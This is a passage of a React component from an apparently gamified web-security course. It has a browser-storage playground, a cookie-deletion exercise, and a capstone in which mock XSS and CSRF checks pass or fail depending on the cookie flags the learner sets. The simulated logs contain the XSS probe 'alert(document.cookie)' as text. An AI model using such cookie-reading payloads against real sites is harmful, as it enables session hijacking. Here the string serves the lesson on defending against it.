                          <div className="p-2 bg-red-500/10 border border-red-500/20 text-red-500 rounded text-[10px] font-mono text-center">
                            🚨 Session Compromised: Cookie data has been stolen.
                          </div>
                        )}
                        {xssStatus === 'success' && (
                          <div className="p-2 bg-green-500/10 border border-green-500/20 text-neon-green rounded text-[10px] font-mono text-center">
                            🛡️ Session Protected: Cookie remains secure from XSS.
                          </div>
                        )}
                      </div>

                      {/* Storage Playground */}
                      <div className="border border-cyber-border/40 p-4 rounded-xl bg-cyber-card flex flex-col gap-3">
                        <div className="flex items-center justify-between border-b border-cyber-border pb-1.5">
                          <span className="font-bold font-sans text-neon-cyan uppercase">4. Storage Playground & Comparison</span>
                        </div>
                        <p className="text-[11px] text-text-muted">Save data keys and observe how they reside on different browser storage engines.</p>

                        <div className="grid grid-cols-3 gap-1.5">
                          <input 
                            type="text" 
                            value={playKey}
                            placeholder="Key"
                            onChange={(e) => setPlayKey(e.target.value)}
                            className="bg-terminal-bg border border-cyber-border rounded px-2 py-1 text-xs text-neon-blue focus:outline-none focus:border-neon-cyan"
                          />
                          <input 
                            type="text" 
                            value={playValue}
                            placeholder="Value"
                            onChange={(e) => setPlayValue(e.target.value)}
                            className="bg-terminal-bg border border-cyber-border rounded px-2 py-1 text-xs text-neon-blue focus:outline-none focus:border-neon-cyan"
                          />
                          <select 
                            value={playType}
                            onChange={(e) => setPlayType(e.target.value as any)}
                            className="bg-terminal-bg border border-cyber-border rounded px-1.5 py-1 text-xs text-neon-blue focus:outline-none"
                          >
                            <option value="cookie">Cookie</option>
                            <option value="localStorage">LocalStorage</option>
                            <option value="sessionStorage">SessionStorage</option>
                          </select>
                        </div>

                        <Button 
                          variant="primary" 
                          size="sm"
                          onClick={() => {
                            if (!playKey || !playValue) return;
                            if (playType === 'cookie') {
                              setMockCookies(prev => [{ name: playKey, value: playValue, httpOnly: false, secure: false }, ...prev]);
                            } else if (playType === 'localStorage') {
                              setMockLocalStorage(prev => ({ ...prev, [playKey]: playValue }));
                            } else {
                              setMockSessionStorage(prev => ({ ...prev, [playKey]: playValue }));
                            }
                          }}
                        >
                          Commit to Browser Storage
                        </Button>

                        <div className="border border-cyber-border rounded bg-cyber-bg/50 p-2 text-[10px] font-mono flex flex-col gap-1 text-text-muted max-h-28 overflow-y-auto">
                          <span className="font-bold text-text-main border-b border-cyber-border/40 pb-0.5 uppercase">Live Sandbox Storage Registry</span>
                          <div className="flex flex-col gap-0.5 mt-1 text-[9px]">
                            <span className="text-neon-cyan font-semibold">Cookies:</span>
                            {mockCookies.map((c, i) => (
                              <span key={i} className="pl-2 text-text-main">
                                {c.name}={c.value} {c.httpOnly && <span className="text-[8px] bg-neon-blue/15 text-neon-cyan px-1 rounded">HttpOnly</span>}
                              </span>
                            ))}
                            <span className="text-neon-purple font-semibold mt-1">LocalStorage:</span>
                            {Object.entries(mockLocalStorage).map(([k, v]) => (
                              <span key={k} className="pl-2 text-text-main">{k}={v}</span>
                            ))}
                            <span className="text-neon-pink font-semibold mt-1">SessionStorage:</span>
                            {Object.entries(mockSessionStorage).map(([k, v]) => (
                              <span key={k} className="pl-2 text-text-main">{k}={v}</span>
                            ))}
                          </div>
                        </div>

                        {/* Comparison Matrix Table */}
                        <div className="overflow-x-auto border border-cyber-border rounded bg-cyber-bg/30 text-[9px] font-sans">
                          <table className="min-w-full border-collapse">
                            <thead>
                              <tr className="bg-white/5 border-b border-cyber-border/40 font-bold text-neon-cyan">
                                <th className="p-1.5 text-left">Feature</th>
                                <th className="p-1.5 text-left">Cookie</th>
                                <th className="p-1.5 text-left">LocalStorage</th>
                                <th className="p-1.5 text-left">SessionStorage</th>
                              </tr>
                            </thead>
                            <tbody>
                              <tr className="border-b border-cyber-border/20 text-text-main">
                                <td className="p-1.5 font-bold">Sent to Server</td>
                                <td className="p-1.5 text-neon-green">✅ Auto</td>
                                <td className="p-1.5 text-red-500">❌ No</td>
                                <td className="p-1.5 text-red-500">❌ No</td>
                              </tr>
                              <tr className="border-b border-cyber-border/20 text-text-main">
                                <td className="p-1.5 font-bold">Size Limit</td>
                                <td className="p-1.5">4KB</td>
                                <td className="p-1.5">5MB+</td>
                                <td className="p-1.5">5MB+</td>
                              </tr>
                              <tr className="text-text-main">
                                <td className="p-1.5 font-bold">Expires</td>
                                <td className="p-1.5">Configurable</td>
                                <td className="p-1.5">Permanent</td>
                                <td className="p-1.5">Tab Close</td>
                              </tr>
                            </tbody>
                          </table>
                        </div>
                      </div>

                      {/* DevTools Challenge */}
                      <div className="border border-cyber-border/40 p-4 rounded-xl bg-cyber-card flex flex-col gap-3">
                        <div className="flex items-center justify-between border-b border-cyber-border pb-1.5">
                          <span className="font-bold font-sans text-neon-cyan uppercase">5. Browser DevTools Challenge</span>
                        </div>
                        <p className="text-[11px] text-text-muted">Simulate deleting session cookies inside Chrome/Firefox Storage DevTools to verify session termination.</p>

                        <div className="flex flex-col gap-2 p-3 bg-terminal-bg rounded border border-cyber-border text-[10px] font-mono">
                          <div className="flex items-center justify-between">
                            <span>Status:</span>
                            {devtoolsSessionActive ? (
                              <span className="text-neon-green font-bold animate-pulse">● SESSION ACTIVE (Logged In)</span>
                            ) : (
                              <span className="text-red-500 font-bold">● SESSION EXPIRED (Logged Out)</span>
                            )}
                          </div>
                          
                          <div className="border-t border-cyber-border/40 my-1" />

                          <div className="flex flex-col gap-1.5 text-[9px]">
                            <span className={devtoolsTaskDeleted ? 'text-text-muted line-through' : 'text-neon-cyan'}>
                              Step 1: Locate and Delete the session cookie string in mock storage
                            </span>
                            <span className={devtoolsSessionActive ? 'text-neon-cyan' : 'text-text-muted line-through'}>
                              Step 2: Refresh the simulator viewport
                            </span>
                          </div>
                        </div>

                        <div className="flex gap-2">
                          <Button 
                            variant="danger" 
                            size="sm"
                            className="flex-1"
                            disabled={devtoolsTaskDeleted}
                            onClick={() => {
                              setDevtoolsTaskDeleted(true);
                              setMockCookies(prev => prev.filter(c => c.name !== 'session_id'));
                            }}
                          >
                            Delete 'session_id' Cookie
                          </Button>
                          <Button 
                            variant="secondary" 
                            size="sm"
                            className="flex-1"
                            disabled={!devtoolsTaskDeleted && !devtoolsSessionActive}
                            onClick={() => {
                              if (devtoolsTaskDeleted) {
                                setDevtoolsSessionActive(false);
                              } else {
                                setDevtoolsSessionActive(true);
                              }
                            }}
                          >
                            Refresh Simulator
                          </Button>
                        </div>
                        {!devtoolsSessionActive && (
                          <div className="p-2 bg-red-500/10 border border-red-500/20 rounded text-[10px] font-mono text-red-500 text-center">
                            ⚠️ DevTools Action Detected: Cookie deleted. Auth token cleared on reload. Please login again.
                          </div>
                        )}
                      </div>
                    </div>
                  )}

                  {/* Tab Content: Capstone */}
                  {selectedNode.id === 'cookies_session' && activeTab === 'capstone' && (
                    <div className="flex-1 flex flex-col gap-5 text-left text-xs text-text-main overflow-y-auto scrollbar-thin pr-1 pb-4 animate-fade-in">
                      {/* Step-by-Step Flow Visualizer */}
                      <div className="border border-cyber-border/40 p-4 rounded-xl bg-cyber-card flex flex-col gap-3">
                        <div className="flex items-center justify-between border-b border-cyber-border pb-1.5">
                          <span className="font-bold font-sans text-neon-cyan uppercase font-mono">Session Authentication Flow</span>
                          <span className={`text-[8px] font-mono px-1.5 py-0.5 rounded border ${capstoneIsLoggedIn ? 'bg-green-500/10 border-green-500/30 text-neon-green' : 'bg-red-500/10 border-red-500/30 text-red-500'}`}>
                            {capstoneIsLoggedIn ? 'VM SESSION ACTIVE' : 'OFFLINE'}
                          </span>
                        </div>
                        <div className="grid grid-cols-4 gap-1 text-[9px] font-mono text-center relative pt-1">
                          <div className={`p-1.5 rounded border transition-all duration-300 ${capstoneStep >= 1 ? 'border-neon-cyan bg-neon-cyan/5 text-neon-cyan' : 'border-cyber-border/40 text-text-muted'}`}>
                            <span>1. Login</span>
                          </div>
                          <div className={`p-1.5 rounded border transition-all duration-300 ${capstoneStep >= 2 ? 'border-neon-purple bg-neon-purple/5 text-neon-purple' : 'border-cyber-border/40 text-text-muted'}`}>
                            <span>2. Session Registry</span>
                          </div>
                          <div className={`p-1.5 rounded border transition-all duration-300 ${capstoneStep >= 3 ? 'border-neon-pink bg-neon-pink/5 text-neon-pink' : 'border-cyber-border/40 text-text-muted'}`}>
                            <span>3. Cookie Handshake</span>
                          </div>
                          <div className={`p-1.5 rounded border transition-all duration-300 ${capstoneStep >= 4 ? 'border-neon-green bg-neon-green/5 text-neon-green' : 'border-cyber-border/40 text-text-muted'}`}>
                            <span>4. Compliance Auth</span>
                          </div>
                        </div>
                        <p className="text-[10px] text-text-muted text-center italic mt-1 font-sans">
                          {capstoneStep === 1 && "Submit client credentials to verify auth pathways."}
                          {capstoneStep === 2 && "Configure the session ID cookie metadata on the server response."}
                          {capstoneStep === 3 && "Deploy exploits (XSS / CSRF) to verify vulnerability compliance."}
                          {capstoneStep === 4 && "Vulnerabilities mitigated. Session container secure!"}
                        </p>
                      </div>

                      {/* Capstone Control Terminal */}
                      <div className="border border-cyber-border/40 p-4 rounded-xl bg-cyber-card flex flex-col gap-4">
                        {capstoneStep === 1 && (
                          <div className="flex flex-col gap-3">
                            <span className="font-bold font-sans text-neon-cyan uppercase">VM Authentication Compliance</span>
                            <p className="text-[11px] text-text-muted font-sans">Enter credentials to authenticate into the secure server node.</p>
                            <div className="flex flex-col gap-2">
                              <div className="flex flex-col gap-0.5">
                                <label className="text-[10px] font-mono text-text-muted">Username (use: junior_dev)</label>
                                <input 
                                  type="text" 
                                  value={capstoneUsername}
                                  onChange={(e) => setCapstoneUsername(e.target.value)}
                                  className="bg-terminal-bg border border-cyber-border rounded px-2 py-1 text-xs text-neon-blue focus:outline-none focus:border-neon-cyan font-mono"
                                />
                              </div>
                              <div className="flex flex-col gap-0.5">
                                <label className="text-[10px] font-mono text-text-muted">Password (use: password)</label>
                                <input 
                                  type="password" 
                                  value={capstonePassword}
                                  onChange={(e) => setCapstonePassword(e.target.value)}
                                  className="bg-terminal-bg border border-cyber-border rounded px-2 py-1 text-xs text-neon-blue focus:outline-none focus:border-neon-cyan font-mono"
                                />
                              </div>
                              <Button 
                                variant="primary" 
                                size="sm" 
                                className="mt-1"
                                onClick={() => {
                                  if (capstoneUsername === 'junior_dev' && capstonePassword === 'password') {
                                    setCapstoneIsLoggedIn(true);
                                    setCapstoneStep(2);
                                    setCapstoneLogs([
                                      `[Auth] POST /api/login - credentials verified`,
                                      `[Auth] Session ID created: sess_928dfac90182`,
                                      `[Auth] Awaiting Set-Cookie header flags configuration...`
                                    ]);
                                  } else {
                                    setCapstoneLogs([`[Error] Auth Failure: Invalid credentials.`]);
                                  }
                                }}
                              >
                                Authenticate VM Session
                              </Button>
                            </div>
                          </div>
                        )}

                        {capstoneStep === 2 && (
                          <div className="flex flex-col gap-3 animate-fade-in">
                            <span className="font-bold font-sans text-neon-purple uppercase">Response Header Cookie Configurator</span>
                            <p className="text-[11px] text-text-muted font-sans">Apply security attributes to the Set-Cookie header payload to secure it from script reads and cross-origin forged requests.</p>
                            
                            <div className="flex flex-col gap-2 font-mono text-[11px]">
                              <label className="flex items-center gap-2 cursor-pointer select-none">
                                <input 
                                  type="checkbox" 
                                  checked={capstoneHttpOnly} 
                                  onChange={(e) => setCapstoneHttpOnly(e.target.checked)}
                                  className="rounded border-cyber-border text-neon-cyan bg-terminal-bg"
                                />
                                <span>HttpOnly (Blocks XSS token read)</span>
                              </label>
                              <label className="flex items-center gap-2 cursor-pointer select-none">
                                <input 
                                  type="checkbox" 
                                  checked={capstoneSecure} 
                                  onChange={(e) => setCapstoneSecure(e.target.checked)}
                                  className="rounded border-cyber-border text-neon-cyan bg-terminal-bg"
                                />
                                <span>Secure (Requires HTTPS transfer)</span>
                              </label>
                              <div className="flex flex-col gap-1 mt-1 font-sans">
                                <label className="text-[10px] text-text-muted">SameSite Policy (Protects against CSRF)</label>
                                <select 
                                  value={capstoneSameSite}
                                  onChange={(e) => setCapstoneSameSite(e.target.value as any)}
                                  className="bg-terminal-bg border border-cyber-border rounded px-2 py-1 text-xs text-neon-blue focus:outline-none"
                                >
                                  <option value="None">None (Default Auto-Send)</option>
                                  <option value="Lax">Lax (Default Browser protection)</option>
                                  <option value="Strict">Strict (Maximum compliance protection)</option>
                                </select>
                              </div>
                            </div>

                            <Button 
                              variant="primary" 
                              size="sm"
                              onClick={() => {
                                setCapstoneStep(3);
                                setCapstoneLogs(prev => [
                                  ...prev,
                                  `[Server] Set-Cookie: session_id=sess_928dfac90182; Path=/;${capstoneSecure ? ' Secure;' : ''}${capstoneHttpOnly ? ' HttpOnly;' : ''} SameSite=${capstoneSameSite}`,
                                  `[Pentest] Response headers sent to browser. Awaiting exploit execution...`
                                ]);
                              }}
                            >
                              Deploy Session Response Header &rarr;
                            </Button>
                          </div>
                        )}

                        {capstoneStep === 3 && (
                          <div className="flex flex-col gap-3 animate-fade-in">
                            <span className="font-bold font-sans text-neon-pink uppercase">Vulnerability Defenses Verification</span>
                            <p className="text-[11px] text-text-muted">Execute malicious script and cross-site forge simulations to verify firewall clearance:</p>

                            <div className="grid grid-cols-2 gap-2">
                              <Button 
                                variant={capstoneXssBlocked ? "success" : "danger"} 
                                size="sm"
                                onClick={() => {
                                  if (capstoneHttpOnly) {
                                    setCapstoneXssBlocked(true);
                                    setCapstoneLogs(prev => [
                                      ...prev,
                                      `[Pentest] Exploit XSS payload execution: alert(document.cookie)`,
                                      `[Pentest] [PASSED] browser blocked script access. Session ID is safe.`
                                    ]);
                                  } else {
                                    setCapstoneXssBlocked(false);
                                    setCapstoneLogs(prev => [
                                      ...prev,
                                      `[Pentest] Exploit XSS payload execution: alert(document.cookie)`,
                                      `[Pentest] [FAILED] Token stolen! Read raw session value from DOM.`
                                    ]);
                                  }
                                }}
                              >
                                Run XSS Exploit Check
                              </Button>

                              <Button 
                                variant={capstoneCsrfBlocked ? "success" : "danger"} 
                                size="sm"
                                onClick={() => {
                                  if (capstoneSameSite === 'Strict' || capstoneSameSite === 'Lax') {
                                    setCapstoneCsrfBlocked(true);
                                    setCapstoneLogs(prev => [
                                      ...prev,
                                      `[Pentest] Exploit CSRF forged POST transfer request received.`,
                                      `[Pentest] [PASSED] SameSite attribute blocks browser auto-cookie transmission.`
                                    ]);
                                  } else {
                                    setCapstoneCsrfBlocked(false);
                                    setCapstoneLogs(prev => [
                                      ...prev,
                                      `[Pentest] Exploit CSRF forged POST transfer request received.`,
                                      `[Pentest] [FAILED] Cookie auto-sent. Unauthorized action completed.`
                                    ]);
                                  }
                                }}
                              >
                                Run CSRF Exploit Check
                              </Button>
                            </div>

                            {capstoneHttpOnly && capstoneSecure && (capstoneSameSite === 'Strict' || capstoneSameSite === 'Lax') && capstoneXssBlocked && capstoneCsrfBlocked ? (
                              <Button 
                                variant="success" 
                                size="sm" 
                                className="w-full mt-1"
                                onClick={() => {
                                  setCapstoneStep(4);
                                  setCapstoneLogs(prev => [
                                    ...prev,
                                    `[Approved] Compliance metrics achieved. Clearance key ready.`,
                                    `✓ Cookies & Sessions Master status attained.`
                                  ]);
                                }}
                              >
                                Approve VM Session Compliance &rarr;
                              </Button>
                            ) : (
                              (capstoneXssBlocked === false || capstoneCsrfBlocked === false || (capstoneXssBlocked && capstoneCsrfBlocked && (!capstoneHttpOnly || !capstoneSecure))) && (
                                <Button 
                                  variant="danger" 
                                  size="sm" 
                                  className="w-full mt-1 animate-pulse"
                                  onClick={() => {
                                    setCapstoneStep(2);
                                    setCapstoneXssBlocked(false);
                                    setCapstoneCsrfBlocked(false);
                                    setCapstoneLogs(prev => [
                                      ...prev,
                                      `[Pentest] Security flaws detected. Refactoring response flags...`
                                    ]);
                                  }}
                                >
                                  Refactor Cookie Security Configuration
                                </Button>
                              )
                            )}
                          </div>
                        )}

                        {capstoneStep === 4 && (
                          <div className="flex flex-col gap-3 items-center text-center py-2 animate-fade-in">
                            <Award className="w-12 h-12 text-amber-400 animate-bounce" />
                            <h4 className="text-sm font-bold text-white">Compliance Validation Completed!</h4>
                            <p className="text-[11px] text-text-muted max-w-sm font-sans">
                              You successfully secured the DevCorp developer session, mitigated script hijacking, and blocked cross-origin requests.
                            </p>
                            
                            {!capstoneSolved ? (
                              <Button 
                                variant="success" 
                                size="md" 
                                className="w-full mt-2"
                                onClick={() => {
                                  setCapstoneSolved(true);
                                  earnBadge('Cookies & Sessions Master 🍪');
                                }}
                              >
                                Unlock Badge Credentials (+100 XP)
                              </Button>
                            ) : (
                              <div className="bg-green-500/10 border border-green-500/20 text-neon-green rounded p-2 text-center text-[10px] font-mono w-full">
                                ✓ Badge Secured: Cookies & Sessions Master 🍪 (+100 XP Added)
                              </div>
                            )}
                          </div>
                        )}

                        {/* Terminal Console Logs */}
                        {capstoneLogs.length > 0 && (
                          <div className="bg-terminal-bg p-3 rounded border border-cyber-border flex flex-col gap-1 font-mono text-[9px] text-neon-blue max-h-32 overflow-y-auto scrollbar-thin">
                            {capstoneLogs.map((log, idx) => (
                              <span key={idx} className={log.includes('[PASSED]') ? 'text-neon-green' : log.includes('[FAILED]') || log.includes('[Error]') ? 'text-red-500' : ''}>
                                {log}
                              </span>
                            ))}
                          </div>
                        )}
                      </div>
                    </div>
                  )}
                </div>

                {/* Secure Node Button */}
                {((selectedNode.id === 'cookies_session' && quizSuccess && projectSuccess && capstoneSolved) ||
                  (selectedNode.id !== 'cookies_session' && quizSuccess && projectSuccess)) && (
                    <div className="mt-auto border-t border-cyber-border pt-4 flex flex-col gap-3">
                      <div className="flex justify-between items-center text-xs font-mono text-text-muted">
                        <span>Reward Value:</span>
                        <span className="text-neon-cyan font-bold">+{selectedNode.xpReward} XP</span>
                      </div>
                      
                      <Button
                        variant="success"
                        size="md"
                        glow
                        className="w-full"
                        onClick={handleCompleteMilestone}
                      >
                        <Award className="w-4 h-4 text-white" />
                        <span>Secure Node Clearance Key</span>
                      </Button>
                    </div>
                  )}
              </div>

              </div>

            </div>
          </div>
        )}
      </div>
  );
}
